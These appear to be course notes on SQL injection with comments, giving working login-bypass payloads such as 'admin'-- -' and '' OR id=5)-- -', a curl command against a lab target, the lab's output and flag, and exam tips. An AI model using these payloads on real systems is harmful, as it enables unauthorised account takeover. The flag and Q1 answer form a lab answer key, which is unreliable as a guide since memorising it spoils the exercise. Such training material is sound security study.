# Section 10 — Using Comments

---

## SQL Comment Syntax

| Style | Syntax | Notes |
|-------|--------|-------|
| Double-dash | `-- -` | Space required after `--`; use `--+` in URLs; add trailing `-` for clarity |
| Hash | `#` | URL-encode as `%23` in browser address bars |
| Inline | `/* ... */` | Rarely used in basic SQLi |

```sql
-- Everything after -- - is ignored
SELECT * FROM logins WHERE username='admin'-- - ' AND password='anything';
-- Executed as: SELECT * FROM logins WHERE username='admin'

-- # does the same
SELECT * FROM logins WHERE username='admin'; # AND password='anything'
```

> Comments let you **surgically remove** the remainder of the original query after your injection point.

---

## Auth Bypass with Comments (simple case)

**Target query:**
```sql
SELECT * FROM logins WHERE username='INPUT' AND password='INPUT';
```

**Payload:**
```
Username: admin'-- -
Password: (anything)
```

**Resulting query:**
```sql
SELECT * FROM logins WHERE username='admin'-- - ' AND password='anything';
-- Executed as:
SELECT * FROM logins WHERE username='admin';
```

The password check is completely gone. Any admin row in the table → login succeeds.

---

## Auth Bypass with Comments (parentheses case)

When the app wraps conditions in parentheses:

**Target query:**
```sql
SELECT * FROM logins WHERE (username='INPUT' AND id > 1) AND password='HASH';
```

Injecting `admin'-- -` fails because the open `(` has no matching `)`:
```sql
WHERE (username='admin'-- -' AND id > 1) AND password='...'
-- Syntax error: unbalanced parenthesis
```

**Fix — close the parenthesis before commenting:**
```
Username: admin')-- -
```

**Resulting query:**
```sql
SELECT * FROM logins WHERE (username='admin')-- -' AND id > 1) AND password='...';
-- Executed as:
SELECT * FROM logins WHERE (username='admin')
```

All conditions after `)-- -` are stripped. The `id > 1` restriction is gone.

---

## Targeting a Specific Row

When you need to log in as a specific user ID (not just any row):

**Payload:**
```
Username: ' OR id=5)-- -
Password: (anything)
```

**Resulting query:**
```sql
SELECT * FROM logins WHERE (username='' OR id=5)-- -' AND id > 1) AND password='...';
-- Executed as:
SELECT * FROM logins WHERE (username='' OR id=5)
```

Returns exactly the row with `id=5` regardless of username or password.

---

## Lab — Log in as the User with id=5

**Target:** `http://TARGET_IP:TARGET_PORT/`  
**Objective:** Log in as the user whose id is 5.

**Reasoning:**
- The query uses `(username='...' AND id > 1)` — parentheses require closing before commenting
- Inject `' OR id=5)-- -` as the username: the `'` closes the username string, `OR id=5` targets the row, `)` closes the open parenthesis, `-- -` comments out the rest
- Any password works — the password check never executes

```bash
curl -s http://TARGET_IP:TARGET_PORT/ \
  -d "username=' OR id=5)-- -&password=anything"
```

**Result:**
```
Executing query: SELECT * FROM logins WHERE (username='' OR id=5)-- -' AND id > 1) AND password = '...';
Login successful as user: superadmin
Here's the flag: cdad9ecdf6f14b45ff5c4de32909caec
```

**Q1 Answer:** `cdad9ecdf6f14b45ff5c4de32909caec`

---

## Exam Notes

- Always use `-- -` (with trailing space/dash) not just `--` — MySQL requires a space after the dashes
- URL-encode `#` as `%23` in browser GET requests; `-- -` becomes `--+-` in URL params
- Count open parentheses in the visible query — you must close each one before commenting
- Comments are the cleanest bypass when you know a valid username — no need for OR tricks
- `' OR id=N)-- -` pattern lets you target any specific row by ID, useful when you want a privileged account that isn't the first row
